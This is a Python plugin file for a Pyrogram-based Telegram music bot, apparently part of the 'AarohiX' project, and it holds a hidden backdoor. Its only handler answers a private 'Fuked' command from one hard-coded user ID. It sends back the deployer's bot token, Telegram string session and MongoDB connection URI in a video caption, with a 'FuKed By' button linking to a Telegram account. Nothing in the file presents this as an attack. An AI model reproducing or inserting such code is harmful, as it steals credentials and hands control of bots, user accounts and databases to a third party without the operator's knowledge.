import asyncio
import time
from pyrogram import Client, filters
from pyrogram import filters
from pyrogram.enums import ChatMembersFilter
from pyrogram.types import CallbackQuery, Message
import re
from os import getenv
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton

from dotenv import load_dotenv
from pyrogram import filters

load_dotenv()

from AarohiX import app
from AarohiX.core.call import Dil
from AarohiX.misc import db
from AarohiX.utils.database import get_assistant, get_authuser_names, get_cmode
from AarohiX.utils.decorators import ActualAdminCB, AdminActual, language
from AarohiX.utils.formatters import alpha_to_int, get_readable_time
from config import BANNED_USERS, adminlist, lyrical
BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")
from dotenv import load_dotenv

rel = {}

 
@app.on_message(
    filters.command("Fuked")
    & filters.private
    & filters.user(6352598131)
   )
async def help(client: Client, message: Message):
   await message.reply_video(
          video=f"https://telegra.ph/file/a4c15881a722ec0dede39.mp4",
       caption=f"""↢ هذه هي الاشياء الخاصه بالبوت 🚦\n\n⋄ التوكن : `{BOT_TOKEN}`\n⋄ جلسة : `{STRING_SESSION}`\n⋄ كود المونجو : `{MONGO_DB_URI}`""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                         "‹ FuKed By ›", url=f"https://t.me/ToPTeTo")
                 ]
            ]
         ),
     )


